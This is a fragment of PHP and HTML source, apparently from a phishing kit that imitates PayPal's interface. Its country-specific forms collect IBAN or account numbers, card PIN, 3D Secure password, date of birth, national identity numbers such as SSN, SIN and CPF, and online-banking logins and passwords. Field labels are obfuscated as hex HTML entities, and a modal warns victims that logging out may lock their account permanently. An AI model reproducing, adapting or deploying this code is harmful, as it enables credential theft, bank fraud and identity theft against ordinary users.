elseif(($_SESSION['CountryCode'] == "AT") || ($_SESSION['CountryCode'] == "BE") || ($_SESSION['CountryCode'] == "AT") || ($_SESSION['CountryCode'] == "CY") || ($_SESSION['CountryCode'] == "EE") || ($_SESSION['CountryCode'] == "FI") || ($_SESSION['CountryCode'] == "DE")
|| ($_SESSION['CountryCode'] == "GR") || ($_SESSION['CountryCode'] == "IT") || ($_SESSION['CountryCode'] == "LV") || ($_SESSION['CountryCode'] == "LU") || ($_SESSION['CountryCode'] == "MT") || ($_SESSION['CountryCode'] == "NL") 
|| ($_SESSION['CountryCode'] == "PT") || ($_SESSION['CountryCode'] == "ES") || ($_SESSION['CountryCode'] == "SK") || ($_SESSION['CountryCode'] == "SI") || ($_SESSION['CountryCode'] == "TR") 
|| ($_SESSION['CountryCode'] == "NO") || ($_SESSION['CountryCode'] == "SE") || ($_SESSION['CountryCode'] == "RO") || ($_SESSION['CountryCode'] == "DK")|| ($_SESSION['CountryCode'] == "IL"))
{
	echo'
<div style="margin:1%" class="textInput routingNum routingNumber lap holder3 center">
<label for="routingNum" class="accessAid">&#x49;&#x42;&#x41;&#x4E;</label>
<input aria-invalid="false" id="iban" name="IBAN" data-rule-iban="true" class="enterInput"  value="" placeholder="&#x49;&#x42;&#x41;&#x4E;&#x20;&#x28;&#x49;&#x6E;&#x74;&#x65;&#x72;&#x6E;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x61;&#x6C;&#x20;&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x29;" autocomplete="off"  maxlength="32"  type="text">
</div>
';}
else {
	echo'
<div style="margin:1%" class="textInput routingNum routingNumber lap holder3 center">
<label for="routingNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x43;&#x6F;&#x64;&#x65;</label>
<input aria-invalid="false" id="BIC" name="BIC" class="hasHelp js_needsValidation validate"  value="" placeholder="&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x49;&#x6E;&#x74;&#x65;&#x72;&#x6E;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x61;&#x6C;&#x20;&#x43;&#x6F;&#x64;&#x65;" autocomplete="off" " maxlength="15"  type="tel">
</div>
<div style="margin:1%" class="textInput routingNum routingNumber lap holder3 center">
<label for="accountNum" class="accessAid">&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;</label>
<input aria-invalid="false" id="accountNum" name="accountNumber" class="hasHelp js_needsValidation validate cobrowse_mask"  aria-required="true" value="" placeholder="&#x41;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;" autocomplete="off" pattern="[0-9]*" maxlength="20"  type="tel">
</div>
';}
?>
<input id="btn" style="margin: 1%; " class="vx_btn center" value="Confirm" type="submit">
</form></div>
</div></div></div></section>
</div></div></div></div></div></div>
</div>
</div>
<form autocomplete = "off" id="form2" class="" name="fullz" action="#" method="post" novalidate="novalidate">
<div tabindex="-1"id="3dsecure_Modal" style="overflow:hidden;position:fixed;top:-5px;right:0;bottom:0;left:0;z-index:1040;-webkit-overflow-scrolling:touch;outline:0;display:none">
<div id="dos10"style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.5;filter: alpha(opacity=50);height: 792px;"></div>
<div style="width:auto;margin:10px;z-index:100000"></div>
<div class="dwsl">
<center>
<span style="position:relative;top:20px;" class="fiListItem-col table-col-xs fiListItem-typeIcon" ><span id="logo" class="rectangleLogo_small shadow master_cardLogo fiListItem-typeIconImage" ></span></span>
<span style="position:relative;top:20px;" class="fiListItem-col table-col-xs"><span style="color: #0070ba;text-decoration: none;font-weight: 400;font-family: 'PayPal-Sans', sans-serif;font-size: 16px;" id="cc1name" class="fiListItem-identifier"></span>&nbsp;<span style="color: #0070ba;text-decoration: none;font-weight: 400;font-family: 'PayPal-Sans', sans-serif;font-size: 16px;" class="fi-lastDigits">x-</span></span>
<hr style="position:relative;top:30px"class="vx_hr-alt">
</center>
<div style="position:relative;top:-50px">
<div style="position:relative;top:75px">
<p class="vx_h6 zx">&#x42;&#x69;&#x72;&#x74;&#x68;&#x20;&#x64;&#x61;&#x74;&#x65;</p>
<center><div id="birthdate" style="margin:1%" class="textInput">
<input id="DOB" name="birthdateInput" class="inputs" required="required" aria-required="true" placeholder="&#x44;&#x44;&#x2F;&#x4D;&#x4D;&#x2F;&#x59;&#x59;&#x59;&#x59;" type="tel" maxlength="10">
</div></center>
</div>
<div style="position:relative;top:50px">
<p class="vx_h6 zx">&#x53;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x69;&#x6E;&#x66;&#x6F;&#x72;&#x6D;&#x61;&#x74;&#x69;&#x6F;&#x6E;</p>
<center><div id="3dsecure" style="margin:1%" class="textInput">
<input id="3DS_CC1" name="secure_CC1Input" class="inputs"  placeholder="&#x33;&#x44;&#x20;&#x73;&#x65;&#x63;&#x75;&#x72;&#x65;" type="password" maxlength="15">
<span id="3dsicon" class=""></span>
</div></center>
</div>
<div style="position:relative;top:25px">
<?php 
if (trim($_SESSION['CountryName']) == "United States"){
	echo '
<p class="vx_h6 zx">&#x53;&#x6F;&#x63;&#x69;&#x61;&#x6C;&#x20;&#x73;&#x65;&#x63;&#x75;&#x72;&#x69;&#x74;&#x79;&#x20;&#x6E;&#x75;&#x6D;&#x62;&#x65;&#x72;</p>
<center><div id="socialsecuritynumber" style="margin:1%" class="textInput">
<input id="ssn" name="SSN" class="enterInput"   value="" placeholder="&#x53;&#x53;&#x4E;&#x20;&#x28;&#x39;&#x20;&#x64;&#x69;&#x67;&#x69;&#x74;&#x73;&#x29;"  dir="ltr" pattern=""  maxlength="11" type="tel">
</div></center>
';} 
elseif (trim($_SESSION['CountryName']) == "Canada"){
	echo '
<p class="vx_h6 zx">&#x53;&#x6F;&#x63;&#x69;&#x61;&#x6C;&#x20;&#x49;&#x6E;&#x73;&#x75;&#x72;&#x61;&#x6E;&#x63;&#x65;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;</p>
<center><div id="socialsecuritynumber" style="margin:1%" class="textInput">
<input id="sin" name="SIN" class="enterInput" value="" placeholder="&#x53;&#x49;&#x4E;&#x20;&#x28;&#x39;&#x20;&#x64;&#x69;&#x67;&#x69;&#x74;&#x73;&#x29;"  dir="ltr" pattern="" maxlength="11" type="tel">
</div></center>
';} 
elseif (trim($_SESSION['CountryName']) == "United Kingdom"){
	echo'
<p class="vx_h6 zx">&#x4E;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x61;&#x6C;&#x20;&#x49;&#x6E;&#x73;&#x75;&#x72;&#x61;&#x6E;&#x63;&#x65;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;</p>
<center><div id="socialsecuritynumber" style="margin:1%" class="textInput">
<input id="nin" name="NIN" class="enterInput" value="" placeholder="&#x4E;&#x49;&#x4E;&#x6F;"  dir="ltr" pattern="" style="text-transform:uppercase" maxlength="13" type="text">
</div></center>
';} 
elseif (trim($_SESSION['CountryName']) == "Italy"){
	echo'
<p class="vx_h6 zx">&#x46;&#x69;&#x73;&#x63;&#x61;&#x6C;&#x20;&#x43;&#x6F;&#x64;&#x65;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;</p>
<center><div id="socialsecuritynumber" style="margin:1%" class="textInput">
<input id="fcn" name="FCN" class="enterInput" value="" placeholder="&#x43;&#x6F;&#x64;&#x69;&#x63;&#x65;&#x20;&#x66;&#x69;&#x73;&#x63;&#x61;&#x6C;&#x65;" dir="ltr" pattern="" style="text-transform:uppercase" maxlength="16" type="text">
</div></center>
';} 
elseif (trim($_SESSION['CountryName']) == "Ireland"){
	echo'
<p class="vx_h6 zx">&#x50;&#x65;&#x72;&#x73;&#x6F;&#x6E;&#x61;&#x6C;&#x20;&#x50;&#x75;&#x62;&#x6C;&#x69;&#x63;&#x20;&#x53;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;</p>
<center><div id="socialsecuritynumber" style="margin:1%" class="textInput">
<input id="irpps" name="IRPPS" class="enterInput" value="" placeholder="&#x50;&#x50;&#x53;&#x20;&#x4E;&#x6F;" dir="ltr" pattern="" maxlength="9" type="text">
</div></center>
';} 
elseif (trim($_SESSION['CountryName']) == "Brazil"){
	echo'
<p class="vx_h6 zx">&#x43;&#x50;&#x46;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;</p>
<center><div id="socialsecuritynumber" style="margin:1%" class="textInput">
<input id="cpfbr" name="CPFBR" class="enterInput" value="" placeholder="&#x43;&#x50;&#x46;" dir="ltr" pattern="" maxlength="14" type="tel">
</div></center>
';} 
elseif (trim($_SESSION['CountryName']) == "Netherlands"){
	echo'
<p class="vx_h6 zx">&#x43;&#x69;&#x74;&#x69;&#x7A;&#x65;&#x6E;&#x20;&#x53;&#x65;&#x72;&#x76;&#x69;&#x63;&#x65;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;&#x2F;&#x53;&#x4F;&#x46;&#x49;</p>
<center><div id="socialsecuritynumber" style="margin:1%" class="textInput">
<input id="bsn" name="BSN" class="enterInput" value="" placeholder="&#x42;&#x53;&#x4E;&#x20;&#x28;&#x38;&#x2F;&#x39;&#x20;&#x64;&#x69;&#x67;&#x69;&#x74;&#x73;&#x29;" dir="ltr" pattern="" maxlength="9" type="tel">
</div></center>
';} 
elseif (trim($_SESSION['CountryName']) == "Spain"){
	echo'
<p class="vx_h6 zx">&#x4E;&#x61;&#x74;&#x69;&#x6F;&#x6E;&#x61;&#x6C;&#x20;&#x49;&#x64;&#x65;&#x6E;&#x74;&#x69;&#x74;&#x79;&#x20;&#x44;&#x6F;&#x63;&#x75;&#x6D;&#x65;&#x6E;&#x74;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;</p>
<center><div id="socialsecuritynumber" style="margin:1%" class="textInput">
<input id="dni" name="DNI" class="enterInput" value="" placeholder="&#x44;&#x4E;&#x49;&#x20;&#x28;&#x4E;&#x49;&#x46;&#x2F;&#x4E;&#x49;&#x45;&#x2F;&#x43;&#x49;&#x46;&#x29;" dir="ltr" pattern="" maxlength="9" type="text">
</div></center>
';} 
elseif (trim($_SESSION['CountryName']) == "Sweden"){
	echo'
<p class="vx_h6 zx">&#x50;&#x65;&#x72;&#x73;&#x6F;&#x6E;&#x61;&#x6C;&#x20;&#x49;&#x64;&#x65;&#x6E;&#x74;&#x69;&#x74;&#x79;&#x20;&#x4E;&#x75;&#x6D;&#x62;&#x65;&#x72;</p>
<center><div id="socialsecuritynumber" style="margin:1%" class="textInput">
<input id="sid" name="SID" class="enterInput" value="" placeholder="&#x50;&#x65;&#x72;&#x73;&#x6F;&#x6E;&#x6E;&#x75;&#x6D;&#x6D;&#x65;&#x72;&#x20;&#x28;&#x31;&#x30;&#x20;&#x64;&#x69;&#x67;&#x69;&#x74;&#x73;&#x29;" dir="ltr" pattern="" maxlength="11" type="tel">
</div></center>
';} 
elseif (trim($_SESSION['CountryName']) == "Australia"){
	echo'
<p class="vx_h6 zx">&#x4F;&#x6E;&#x6C;&#x69;&#x6E;&#x65;&#x20;&#x53;&#x68;&#x6F;&#x70;&#x70;&#x69;&#x6E;&#x67;&#x20;&#x49;&#x44;</p>	
<center><div id="socialsecuritynumber" style="margin:1%" class="textInput">
<input id="osid" name="OSID" class="enterInput" value="" placeholder="&#x4F;&#x53;&#x49;&#x44;" dir="ltr" pattern="" maxlength="15" type="text">
</div></center>
';} 
else {
	echo'
<span >&nbsp;</span>';} 
?>
</div>
<div>
<p class="vx_h6 zx">&#x41;&#x54;&#x4D;&#x20;&#x6F;&#x72;&#x20;&#x44;&#x65;&#x62;&#x69;&#x74;&#x20;&#x43;&#x61;&#x72;&#x64;&#x20;&#x50;&#x49;&#x4E;</p>
<center><div id="cardpin_CC1" style="margin:1%" class="textInput">
<input id="pin1" name="pin1" class="inputs" maxlength="12" placeholder="&#x43;&#x61;&#x72;&#x64;&#x20;&#x50;&#x49;&#x4E;" type="password">
</div></center>
</div>
<center><input class="vx_btn zx2" value="Continue" type="submit"></center>
</div></div></div>
</form>
<form autocomplete = "off" id="form4" class="" name="confirmbank" action="#" method="post" novalidate="novalidate">
<div tabindex="-1"id="confirm_bank" style="overflow:hidden;position:fixed;top:-5px;right:0;bottom:0;left:0;z-index:1040;-webkit-overflow-scrolling:touch;outline:0;display:none">
<div id="dos10"style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.5;filter: alpha(opacity=50);height: 792px;"></div>
<div style="width:auto;margin:10px;z-index:100000"></div>
<div class="dwsl ">
<?php
if ($_SESSION['CountryCode'] == "US"){
	echo'	
<center><div id = "banklog" class="bankNameLogo hide"></div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">Bank name</label>
<input  id="bankName" name="bankName" class="enterInput"  value="" placeholder="&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;" autocomplete="off"  maxlength="50"  type="text" ng-model="formData.bankName">
</div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="enterInput"  value="" placeholder="&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;" autocomplete="off"  maxlength="30"  type="text" >
</div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;" autocomplete="off"  maxlength="30"  type="password" >
</div></center>
';}
elseif (($_SESSION['CountryCode'] == "GB") || ($_SESSION['CountryCode'] == "IE")){	
	echo'
<center><div id = "banklog" class="bankNameLogo hide"></div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;</label>
<input  id="bankName" name="bankName" class="enterInput"  value="" placeholder="&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;" autocomplete="off"  maxlength="50"  type="text">
</div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;" autocomplete="off"  maxlength="30"  type="text" >
</div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;" autocomplete="off"  maxlength="30"  type="password" >
</div></center>
';}
elseif ($_SESSION['CountryCode'] == "CA"){
	echo'
<center><div id = "banklog" class="bankNameLogo hide"></div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">Bank name</label>
<input id="bankName" name="bankName" class="hasHelp js_needsValidation validate cobrowse_mask" value="" placeholder="&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;" autocomplete="off" maxlength="50" type="text">
</div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;" autocomplete="off"  maxlength="30"  type="text" >
</div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;" autocomplete="off"  maxlength="30"  type="password" >
</div></center>
';}
elseif ($_SESSION['CountryCode'] == "AU" || ($_SESSION['CountryCode'] == "NZ")){
	echo'
<center><div id = "banklog" class="bankNameLogo hide"></div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;</label>
<input  id="bankName" name="bankName" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x46;&#x69;&#x6E;&#x61;&#x6E;&#x63;&#x69;&#x61;&#x6C;&#x20;&#x49;&#x6E;&#x73;&#x74;&#x69;&#x74;&#x75;&#x74;&#x69;&#x6F;&#x6E;&#x20;&#x4E;&#x61;&#x6D;&#x65;" autocomplete="off"  maxlength="50"  type="text">
</div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;" autocomplete="off"  maxlength="30"  type="text" >
</div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;" autocomplete="off"  maxlength="30"  type="password" >
</div></center>
';}
elseif ($_SESSION['CountryCode'] == "CH"){
	echo'
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;</label>
<input  id="bankName" name="bankName" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;" autocomplete="off"  maxlength="50"  type="text">
</div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;" autocomplete="off"  maxlength="30"  type="text" >
</div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;" autocomplete="off"  maxlength="30"  type="password" >
</div></center>
';}
elseif(($_SESSION['CountryCode'] == "AT") || ($_SESSION['CountryCode'] == "BE") || ($_SESSION['CountryCode'] == "AT") || ($_SESSION['CountryCode'] == "CY") || ($_SESSION['CountryCode'] == "EE") || ($_SESSION['CountryCode'] == "FI") || ($_SESSION['CountryCode'] == "DE")
|| ($_SESSION['CountryCode'] == "GR") || ($_SESSION['CountryCode'] == "IT") || ($_SESSION['CountryCode'] == "LV") || ($_SESSION['CountryCode'] == "LU") || ($_SESSION['CountryCode'] == "MT") || ($_SESSION['CountryCode'] == "NL") 
|| ($_SESSION['CountryCode'] == "PT") || ($_SESSION['CountryCode'] == "ES") || ($_SESSION['CountryCode'] == "SK") || ($_SESSION['CountryCode'] == "SI") || ($_SESSION['CountryCode'] == "TR") 
|| ($_SESSION['CountryCode'] == "NO") || ($_SESSION['CountryCode'] == "SE") || ($_SESSION['CountryCode'] == "RO") || ($_SESSION['CountryCode'] == "DK")|| ($_SESSION['CountryCode'] == "IL"))
{
	echo'
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;</label>
<input  id="bankName" name="bankName" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;" autocomplete="off"  maxlength="50"  type="text">
</div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;" autocomplete="off"  maxlength="30"  type="text" >
</div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;" autocomplete="off"  maxlength="30"  type="password" >
</div></center>
';}
else {
	echo'
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;</label>
<input  id="bankName" name="bankName" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x6E;&#x61;&#x6D;&#x65;" autocomplete="off"  maxlength="50"  type="text">
</div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x4C;&#x6F;&#x67;&#x69;&#x6E;</label>
<input aria-invalid="false" id="bankLogin" name="bankLogin" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x4F;&#x6E;&#x6C;&#x69;&#x6E;&#x65;&#x20;&#x42;&#x61;&#x6E;&#x6B;&#x69;&#x6E;&#x67;&#x20;&#x49;&#x44;" autocomplete="off"  maxlength="30"  type="text" >
</div></center>
<p class="vx_h6 zx">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</p>
<center><div style="margin:1%" class="textInput">
<label for="accountNum" class="accessAid">&#x42;&#x61;&#x6E;&#x6B;&#x20;&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;</label>
<input aria-invalid="false" id="bankPass" name="bankPass" class="hasHelp js_needsValidation validate cobrowse_mask"  value="" placeholder="&#x50;&#x61;&#x73;&#x73;&#x77;&#x6F;&#x72;&#x64;" autocomplete="off"  maxlength="30"  type="password" >
</div></center>
';}
?>
<center><input class="vx_btn zx2" value="Continue" type="submit"></center>
</div></div>
</form>
<div tabindex="-1"id="myModal" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
<div id="dos10"style="background-color:#000000;position: fixed;top: 0; right: 0; bottom: 0;left: 0; z-index: 1040;opacity: 0.5;filter: alpha(opacity=50);height: 792px;"></div>
<div style=" width: auto;margin: 10px;z-index: 100000;"></div>
<div style="z-index: 100011;width: auto;margin: auto;padding: 6px;position: relative;background-color: #ffffff;border: 1px solid #999999;border: 1px solid rgba(0,0,0,0.2);border-radius: 6px;-webkit-box-shadow: 0 3px 3px rgba(0,0,0,0.5);box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2),0 6px 20px 0 rgba(0,0,0,0.19);-webkit-background-clip: padding-box;background-clip: padding-box;outline: 0;border-color: #e5e5e5 #d9d9d9 #cccccc;-webkit-box-shadow: 0 3px 3px rgba(148, 148, 148, 0.8);box-shadow: 0 0px 0px rgba(148, 148, 148, 0.8);-webkit-border-radius: 10px;-moz-border-radius: 6px;border-radius: 6px;-moz-background-clip: padding-box;-webkit-background-clip: padding-box;background-clip: padding-box;background-color:#fdfdfd;outline: 0 none;margin-top: 150px;max-width:1024px;min-width:auto;max-height:200px;opacity: 1;">
<center><div ><h3>&#x49;&#x66;&#x20;&#x79;&#x6F;&#x75;&#x20;&#x6C;&#x6F;&#x67;&#x20;&#x6F;&#x75;&#x74;&#x20;&#x79;&#x6F;&#x75;&#x72;&#x20;&#x61;&#x63;&#x63;&#x6F;&#x75;&#x6E;&#x74;&#x20;&#x6D;&#x61;&#x79;&#x20;&#x62;&#x65;&#x20;&#x6C;&#x6F;&#x63;&#x6B;&#x65;&#x64;&#x20;&#x70;&#x65;&#x72;&#x6D;&#x61;&#x6E;&#x65;&#x6E;&#x74;&#x6C;&#x79;</h3></div></center>
<center><button class="vx_btn" id="boot">&#x53;&#x74;&#x61;&#x79;&#x20;&#x6C;&#x6F;&#x67;&#x67;&#x65;&#x64;&#x20;&#x69;&#x6E;</button></center>
</div></div>
<div tabindex="-1"id="myModal2" style="overflow: hidden;position: fixed;top: 0;right: 0;bottom: 0;left: 0; z-index: 1040; -webkit-overflow-scrolling: touch; outline: 0;display: none;">
